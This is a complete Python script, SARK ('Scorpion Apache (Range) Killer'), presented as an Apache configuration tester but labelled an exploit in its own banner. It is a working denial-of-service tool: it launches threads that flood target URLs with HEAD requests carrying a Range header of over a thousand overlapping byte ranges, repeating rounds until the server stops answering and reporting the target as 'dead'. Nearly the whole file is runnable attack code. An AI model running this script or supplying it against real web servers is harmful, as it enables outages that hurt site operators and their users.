#!/usr/bin/python

#
# SARK
# Scorpion Apache (Range) Killer
# A tool for testing Apache configuration
#
# Author: Patryk Jaworski
# Contact:
# -> E-mail: skorpion9312@gmail.com
# -> XMPP/Jabber: skorpion9312@jabber.org
# 
# Copyright (c) by Patryk Jaworski
# License: GNU GPLv3
# 

from threading import Thread;
from getopt import getopt, GetoptError;
from time import strftime, localtime, sleep;
from urllib.parse import urlparse;
import sys;
import datetime;
import socket;

class SARK:
	__verbose = False;
	__threads_num = 30;
	__ranges = 150;
	__interval = 3;
	__urls = [];
	__threads = [];
	__status = {};

	@staticmethod
	def sign():
		return "SARK v0.1";

	@staticmethod
	def header():
		print((" ~ %s ~ " % SARK.sign()).center(55, "="));
		print("=" + "Scorpion Apache (Range) Killer".center(53) + "=");
		print("=" + "A tool for testing Apache configuration".center(53) + "=");
		print("=" + "http://github.com/Skorpion9312/sark".center(53) + "=");
		print("=" + "=".rjust(54));
		print("=" + "Copyright 2011 by".center(53) + "=");
		print("=" + "Patryk Jaworski".center(53) + "=");
		print("=" + "=".rjust(54));
		print("=" + " Contact:".ljust(53) + "=");
		print("=" + " -> E-mail: skorpion9312@gmail.com".ljust(53) + "=");
		print("=" + " -> XMPP: skorpion9312@jabber.org".ljust(53) + "=");
		print("=" + "=".rjust(54));
		print(" ~ GNU GPLv3 EXPLOIT ~ ".center(55, "=") + "\n");
	
	@staticmethod
	def info(msg):
		print("[I][%s] %s" % (SARK.time(), msg));
	
	@staticmethod
	def error(msg):
		print("[E][%s] %s" % (SARK.time(), msg));

	@staticmethod
	def debug(msg):
		print("[V][%s] %s" % (SARK.time(), msg));
	
	@staticmethod
	def time():
		return strftime("%d-%m-%Y ~ %H:%M:%S", localtime());

	def __V(self, msg):
		if self.__verbose:
			SARK.debug(msg);

	def __init__(self):
		SARK.header();
		args = [];
		opts = [];
		try:
			opts, args = getopt(sys.argv[1:], "hvut:i:", ["help", "usage", "verbose", "threads=", "interval="]);
			for arg in args:
				if arg[0:7] != "http://":
					continue;
				self.__urls.append(arg);
			for option, value in opts:
				if option in ("-h", "--help", "-u", "--usage"):
					self.__usage();
					sys.exit(3);
				elif option in ("-v", "--verbose"):
					self.__verbose = True;
				elif option in ("-t", "--threads"):
					self.__threads_num = int(value);
					if self.__threads_num < 1:
						raise Exception("WTF?");
				elif option in ("-i", "--interval"):
					self.__interval = int(value);
					if self.__interval < 1:
						raise Exception("WTF?");
				else:
					raise GetoptError();
			if len(self.__urls) == 0:
				raise Exception("WTF?");
		except Exception as e:
			print("[E] Bad options, run SARK with --help or --usage option to see all available possibilities.");
			sys.exit(1);
		try:
			self.__kill();
		except KeyboardInterrupt:
			print("\n");
			SARK.info("SARK ABORTED");
			self.__summary();
			sys.exit(2);

	def __usage(self):
		print("\nUsage: ./sark.py [-t NUM] [-i SEC] [-v] TARGET-1-URL TARGET-2-URL (...)\n");
		print(" -t NUM, --threads NUM");
		print("     The number of threads that will be used to single attack");
		print(" -i SEC, --interval SEC");
		print("     Interval betwean targets");
		print(" -v, --verbose");
		print("     Enable verbose messages");
		print(" -h, --help");
		print("     Print this help message and exit");
		print(" -u, --usage");
		print("     Print this help message and exit");
		print("");

	def __kill(self):
		stats = ("Unable to connect", "Unable to send data", "Data sent");
		SARK.info("Starting attack...");
		sleep(1);
		for url in self.__urls:
			SARK.info("Target: %s" % url);
			sleep(2);
			try:
				num = 1;
				self.__status[url] = "Unknown";
				while(True):
					try:
						SARK.info("Starting $%d" % num); 
						self.__threads = [];
						self.__V("Creating threads...");
						fails = 0;
						for id in range(0, self.__threads_num):
							#TODO: Headers?
							thread = self.__Worker(url, id);
							self.__threads.append(thread);
							thread.start();
						for thread in self.__threads:
							thread.join();
							self.__V("Thread #%d status: %s" % (thread.id(), stats[thread.status()]));
							if(thread.status() < 1):
								fails += 1;
							thread.close();
						SARK.info("$%d summary: %d/%d" % (num, self.__threads_num - fails, self.__threads_num));
						if fails == self.__threads_num:
							SARK.info(" -> $%d: Target is dead (or we are banned) after %d attack%s." % (num, num, "" if num == 1 else "s"));
							self.__status[url] = "Dead (or we are banned)";
							break;
						else:
							SARK.info("-> Target is still alive...");
							self.__status[url] = "Alive";
						num += 1;
						sleep(self.__interval);
					except KeyboardInterrupt:
						print("\n");
						SARK.info("Action $%d (%s) aborted." % (num, url));
						self.__status[url] = "Aborted (alive?)";
						print();
						raise KeyboardInterrupt;

			except KeyboardInterrupt:
				continue;
		self.__summary();
	
	def __summary(self):
		print();
		print(" ~ Summary ~ ".center(55, "="));
		i = 1;
		for url in self.__urls:
			try:
				status = self.__status[url]
			except KeyError:
				status = "Virgin - untouched";
			print("[%d] %s: %s" % (i, url.ljust(35, "."), status));
			i += 1;
		print((" ~ %s ~ " % (SARK.sign())).center(55, "="));
		print();
		
	class __Worker(Thread):
		__url = None;
		__addr = None;
		__port = 80;
		__id = -1;
		__status = -1;
		__socket = None;
		__headers = ["Accept-Encoding: gzip", "User-Agent: SARK v0.1 - Scorpion Apache (Rank) Killer", "Connection: close"];

		def __V(self, msg):
			SARK.debug("Worker #%d: " % (self.__id, msg));
		
		def __init__(self, url, uid, headers = []):
			Thread.__init__(self);
			self.__url = urlparse(url);
			self.__addr = self.__url.hostname;
			self.__port = self.__url.port;
			if not self.__port:
				self.__port = 80;
			self.__path = self.__url.path;
			self.__id = uid;
			self.__status = -1;
			self.__headers += headers;

		def __getRequest(self):
			request = "HEAD %s HTTP/1.1\r\n" % self.__path;
			request += "Host: %s\r\n" % self.__addr;
			request += "Range: bytes=0-93, 12-93";
			for i in range(10, 1010):
				request += ", 9-%d" % i;
			request += "\r\n"
			for header in self.__headers:
				request += header + "\r\n";
			request += "\r\n";
			return request;

		def run(self):
			try:
				self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
				self.__status = 0;
				self.__socket.connect((self.__addr, self.__port));
				self.__status = 1;
				self.__socket.send(self.__getRequest().encode());
				self.__status = 2;
			except socket.error:
				pass;

		def status(self):
			return self.__status;

		def id(self):
			return self.__id;

		def close(self):
			if self.__socket != None:
				self.__socket.close();

if __name__ == "__main__":
	SARK();
